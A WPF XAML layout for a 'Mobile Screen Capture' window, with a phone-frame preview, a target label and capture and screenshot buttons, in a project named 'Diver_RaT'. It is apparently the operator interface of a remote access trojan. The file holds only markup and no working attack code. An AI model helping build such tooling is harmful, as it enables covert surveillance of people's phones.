<Window x:Class="Diver_RaT.ScreenCaptureMobileWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        Title="Mobile Screen Capture" Height="780" Width="460"
        WindowStartupLocation="CenterOwner"
        ResizeMode="CanResize"
        WindowStyle="None"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <ui:CustomTitleBar Grid.Row="0" Title="Mobile Screen Capture"/>

        <Grid Grid.Row="1" Margin="14">
            <Grid.RowDefinitions>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>

            <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
                <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
                <TextBlock Text="MOBILE SCREEN" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
                <TextBlock x:Name="TargetText" FontSize="12" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
            </StackPanel>

            <!-- Phone-frame preview area (portrait ratio) -->
            <Border Grid.Row="1" Background="#E60C0F0B" CornerRadius="24"
                    BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="2"
                    Padding="8" Margin="0,0,0,10">
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="*"/>
                        <RowDefinition Height="Auto"/>
                    </Grid.RowDefinitions>

                    <!-- speaker notch -->
                    <Border Grid.Row="0" Width="70" Height="8" CornerRadius="4"
                            Background="{StaticResource GlassBorderBrush}" HorizontalAlignment="Center" Margin="0,10,0,8"/>

                    <Grid Grid.Row="1">
                        <Viewbox Stretch="Uniform">
                            <Image x:Name="ScreenImage" Source="{x:Null}" Stretch="Uniform"/>
                        </Viewbox>
                        <TextBlock x:Name="Placeholder" Text="&#x1f5b5;&#xfe0f;" FontSize="44"
                                   HorizontalAlignment="Center" VerticalAlignment="Center"
                                   Foreground="{StaticResource MutedBrush}"/>
                    </Grid>

                    <!-- home indicator -->
                    <Border Grid.Row="2" Width="90" Height="6" CornerRadius="3"
                            Background="{StaticResource GlassBorderBrush}" HorizontalAlignment="Center" Margin="0,8,0,10"/>
                </Grid>
            </Border>

            <StackPanel Grid.Row="2">
                <StackPanel Orientation="Horizontal">
                    <Button x:Name="CaptureButton" Content="&#x21bb;  Capture Now" Click="CaptureButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
                    <Button x:Name="SaveButton" Content="&#x1f4be;  Screenshot" Click="SaveButton_Click" Padding="12,0" Height="30" IsEnabled="False"/>
                </StackPanel>
                <TextBlock x:Name="StatusText" Margin="2,8,0,0" FontSize="12" Foreground="{StaticResource MutedBrush}" TextWrapping="Wrap"/>
            </StackPanel>
        </Grid>
        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>